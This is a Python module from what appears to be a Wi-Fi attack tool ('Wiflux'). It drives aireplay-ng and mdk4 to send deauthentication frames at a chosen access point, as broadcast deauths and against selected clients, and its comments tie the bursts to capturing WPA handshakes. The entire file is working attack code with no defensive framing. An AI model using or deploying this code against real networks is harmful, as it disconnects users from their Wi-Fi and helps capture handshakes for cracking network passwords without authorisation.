"""Deauthentication via aireplay-ng and mdk4."""

from __future__ import annotations

import time

from ..config import WifluxConfig
from ..process import ManagedProcess, which

# mdk4 respects -c; aireplay-ng always fires 64 frames per --deauth burst.
HANDSHAKE_DEAUTH_PACKETS = 4


class Aireplay:
    @staticmethod
    def deauth(
        cfg: WifluxConfig,
        bssid: str,
        client: str | None = None,
        count: int = 1,
        *,
        essid: str | None = None,
        send_window: float = 0.25,
    ) -> None:
        if cfg.attack.no_deauth:
            return
        cmd = [
            "aireplay-ng", "--deauth", str(count),
            "--ignore-negative-one",
            "-a", bssid,
        ]
        if client:
            cmd.extend(["-c", client])
        if essid:
            cmd.extend(["-e", essid])
        cmd.append(cfg.scan.interface)

        proc = ManagedProcess(cmd, devnull=True)
        time.sleep(send_window)
        proc.kill()

    @staticmethod
    def deauth_target(
        cfg: WifluxConfig,
        bssid: str,
        client: str | None,
        *,
        essid: str | None = None,
        count: int = 1,
    ) -> None:
        if cfg.attack.no_deauth:
            return
        Aireplay.deauth(cfg, bssid, client, count, essid=essid, send_window=0.25)

    @staticmethod
    def deauth_round(
        cfg: WifluxConfig,
        bssid: str,
        clients: list[str],
        *,
        essid: str | None = None,
        focus: str | None = None,
    ) -> None:
        """Deauth broadcast plus one active client — avoids AP nonce reset."""
        if cfg.attack.no_deauth:
            return
        if which("mdk4"):
            Aireplay.mdk4_deauth(cfg, bssid, None, count=HANDSHAKE_DEAUTH_PACKETS)
            target = focus or (clients[0] if clients else None)
            if target:
                Aireplay.mdk4_deauth(cfg, bssid, target, count=HANDSHAKE_DEAUTH_PACKETS)
            return
        count = HANDSHAKE_DEAUTH_PACKETS
        Aireplay.deauth_target(cfg, bssid, None, essid=essid, count=count)
        if focus:
            Aireplay.deauth_target(cfg, bssid, focus, essid=essid, count=count)
        elif clients:
            Aireplay.deauth_target(cfg, bssid, clients[0], essid=essid, count=count)

    @staticmethod
    def mdk4_deauth(
        cfg: WifluxConfig,
        bssid: str,
        client: str | None = None,
        *,
        count: int = HANDSHAKE_DEAUTH_PACKETS,
    ) -> None:
        if cfg.attack.no_deauth or not which("mdk4"):
            return
        cmd = ["mdk4", cfg.scan.interface, "d", "-B", bssid, "-c", str(count)]
        if client:
            cmd.extend(["-S", client])
        proc = ManagedProcess(cmd, devnull=True)
        time.sleep(min(1.0, max(0.3, count * 0.05)))
        proc.kill()

    @staticmethod
    def mdk4_round(cfg: WifluxConfig, bssid: str, clients: list[str]) -> None:
        if cfg.attack.no_deauth or not which("mdk4"):
            return
        Aireplay.mdk4_deauth(cfg, bssid, None)
        for station in clients:
            Aireplay.mdk4_deauth(cfg, bssid, station)